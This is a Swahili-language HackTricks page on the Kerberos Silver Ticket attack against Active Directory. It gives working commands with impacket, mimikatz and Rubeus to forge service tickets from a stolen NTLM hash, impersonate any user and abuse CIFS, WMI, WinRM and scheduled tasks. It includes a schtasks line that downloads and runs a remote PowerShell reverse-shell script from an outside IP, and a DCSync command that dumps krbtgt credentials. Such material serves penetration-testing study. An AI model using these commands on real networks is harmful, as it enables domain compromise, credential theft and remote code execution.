# Tiketi ya Fedha

<details>

<summary><strong>Jifunze kuhusu kudukua AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako inatangazwa kwenye HackTricks** au **kupakua HackTricks kwa muundo wa PDF** Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Pata [**swag rasmi ya PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Shiriki mbinu zako za kudukua kwa kuwasilisha PRs kwenye** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.

</details>

<img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" data-size="original">

Ikiwa una nia ya **kazi ya kudukua** na kudukua yasiyodukuliwa - **tunatoa ajira!** (_inahitajika uwezo wa kuandika na kuzungumza Kipolishi kwa ufasaha_).

{% embed url="https://www.stmcyber.com/careers" %}

## Tiketi ya Fedha

Shambulio la **Tiketi ya Fedha** linahusisha kutumia tiketi za huduma katika mazingira ya Active Directory (AD). Njia hii inategemea **kupata hash ya NTLM ya akaunti ya huduma**, kama vile akaunti ya kompyuta, ili kuunda tiketi ya Huduma ya Kutoa Tiketi (TGS). Kwa tiketi hii bandia, mshambuliaji anaweza kupata huduma maalum kwenye mtandao, **kujifanya kuwa mtumiaji yeyote**, kwa kawaida lengo likiwa ni kupata mamlaka ya usimamizi. Inasisitizwa kwamba kutumia funguo za AES kwa kuunda tiketi ni salama zaidi na vigumu kugundulika.

Kwa kutengeneza tiketi, zana tofauti hutumiwa kulingana na mfumo wa uendeshaji:

### Kwenye Linux
```bash
python ticketer.py -nthash <HASH> -domain-sid <DOMAIN_SID> -domain <DOMAIN> -spn <SERVICE_PRINCIPAL_NAME> <USER>
export KRB5CCNAME=/root/impacket-examples/<TICKET_NAME>.ccache
python psexec.py <DOMAIN>/<USER>@<TARGET> -k -no-pass
```
### Katika Windows
```bash
# Create the ticket
mimikatz.exe "kerberos::golden /domain:<DOMAIN> /sid:<DOMAIN_SID> /rc4:<HASH> /user:<USER> /service:<SERVICE> /target:<TARGET>"

# Inject the ticket
mimikatz.exe "kerberos::ptt <TICKET_FILE>"
.\Rubeus.exe ptt /ticket:<TICKET_FILE>

# Obtain a shell
.\PsExec.exe -accepteula \\<TARGET> cmd
```
Huduma ya CIFS inasisitizwa kama lengo la kawaida la kupata ufikiaji wa mfumo wa faili wa muathirika, lakini huduma nyingine kama HOST na RPCSS pia zinaweza kutumiwa kwa kazi na maswali ya WMI.

## Huduma Zinazopatikana

| Aina ya Huduma | Tiketi za Fedha za Huduma |
| -------------- | ------------------------ |
| WMI            | <p>HOST</p><p>RPCSS</p>  |
| PowerShell Remoting | <p>HOST</p><p>HTTP</p><p>Kulingana na OS pia:</p><p>WSMAN</p><p>RPCSS</p> |
| WinRM | <p>HOST</p><p>HTTP</p><p>Katika hali fulani unaweza tu kuomba: WINRM</p> |
| Kazi Zilizopangwa | HOST |
| Kushiriki Faili za Windows, pia psexec | CIFS |
| Operesheni za LDAP, pamoja na DCSync | LDAP |
| Zana za Utawala wa Seva ya Mbali ya Windows | <p>RPCSS</p><p>LDAP</p><p>CIFS</p> |
| Tiketi za Dhahabu | krbtgt |

Kwa kutumia **Rubeus** unaweza **kuomba zote** tiketi hizi kwa kutumia parameter:

* `/altservice:host,RPCSS,http,wsman,cifs,ldap,krbtgt,winrm`

### Vitambulisho vya Tukio la Tiketi za Fedha

* 4624: Ingia kwenye Akaunti
* 4634: Ingia nje ya Akaunti
* 4672: Ingia kama Msimamizi

## Kutumia vibaya tiketi za Huduma

Katika mifano ifuatayo, fikiria kuwa tiketi inapatikana kwa kujifanya kuwa akaunti ya msimamizi.

### CIFS

Kwa tiketi hii, utaweza kufikia folda za `C$` na `ADMIN$` kupitia **SMB** (ikiwa zimefunuliwa) na nakala faili kwenye sehemu ya mfumo wa faili wa mbali kwa kufanya kitu kama:
```bash
dir \\vulnerable.computer\C$
dir \\vulnerable.computer\ADMIN$
copy afile.txt \\vulnerable.computer\C$\Windows\Temp
```
Pia utaweza kupata kifaa ndani ya mwenyeji au kutekeleza amri za kiholela kwa kutumia **psexec**:

{% content-ref url="../ntlm/psexec-and-winexec.md" %}
[psexec-and-winexec.md](../ntlm/psexec-and-winexec.md)
{% endcontent-ref %}

### MWEZI

Kwa idhini hii, unaweza kuzalisha kazi zilizopangwa kwenye kompyuta za mbali na kutekeleza amri za kiholela:
```bash
#Check you have permissions to use schtasks over a remote server
schtasks /S some.vuln.pc
#Create scheduled task, first for exe execution, second for powershell reverse shell download
schtasks /create /S some.vuln.pc /SC weekly /RU "NT Authority\System" /TN "SomeTaskName" /TR "C:\path\to\executable.exe"
schtasks /create /S some.vuln.pc /SC Weekly /RU "NT Authority\SYSTEM" /TN "SomeTaskName" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.114:8080/pc.ps1''')'"
#Check it was successfully created
schtasks /query /S some.vuln.pc
#Run created schtask now
schtasks /Run /S mcorp-dc.moneycorp.local /TN "SomeTaskName"
```
### HOST + RPCSS

Kwa tiketi hizi unaweza **kutekeleza WMI katika mfumo wa mwathirika**:
```bash
#Check you have enough privileges
Invoke-WmiMethod -class win32_operatingsystem -ComputerName remote.computer.local
#Execute code
Invoke-WmiMethod win32_process -ComputerName $Computer -name create -argumentlist "$RunCommand"

#You can also use wmic
wmic remote.computer.local list full /format:list
```
Pata **maelezo zaidi kuhusu wmiexec** katika ukurasa ufuatao:

{% content-ref url="../ntlm/wmicexec.md" %}
[wmicexec.md](../ntlm/wmicexec.md)
{% endcontent-ref %}

### HOST + WSMAN (WINRM)

Kwa kupata ufikiaji wa winrm juu ya kompyuta unaweza **kufikia** na hata kupata PowerShell:
```bash
New-PSSession -Name PSC -ComputerName the.computer.name; Enter-PSSession PSC
```
Angalia ukurasa ufuatao ili kujifunza **njia zaidi za kuunganisha na mwenyeji wa mbali kwa kutumia winrm**:

{% content-ref url="../ntlm/winrm.md" %}
[winrm.md](../ntlm/winrm.md)
{% endcontent-ref %}

{% hint style="warning" %}
Tafadhali kumbuka kuwa **winrm lazima iwe hai na inasikiliza** kwenye kompyuta ya mbali ili kuifikia.
{% endhint %}

### LDAP

Kwa mamlaka hii, unaweza kudumpisha database ya DC kwa kutumia **DCSync**:
```
mimikatz(commandline) # lsadump::dcsync /dc:pcdc.domain.local /domain:domain.local /user:krbtgt
```
**Jifunze zaidi kuhusu DCSync** katika ukurasa ufuatao:

## Marejeo
* [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets)
* [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)

{% content-ref url="dcsync.md" %}
[dcsync.md](dcsync.md)
{% endcontent-ref %}

<img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" data-size="original">

Ikiwa una nia na **kazi ya kuhack** na kuhack mambo yasiyohack - **tunatafuta wafanyakazi!** (_inahitajika uwezo wa kuandika na kuzungumza Kipolishi kwa ufasaha_).

{% embed url="https://www.stmcyber.com/careers" %}

<details>

<summary><strong>Jifunze kuhusu kuhack AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako ikitangazwa kwenye HackTricks** au **kupakua HackTricks kwa muundo wa PDF** Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Pata [**swag rasmi wa PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**The PEASS Family**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) za kipekee
* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Shiriki mbinu zako za kuhack kwa kuwasilisha PRs kwenye** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
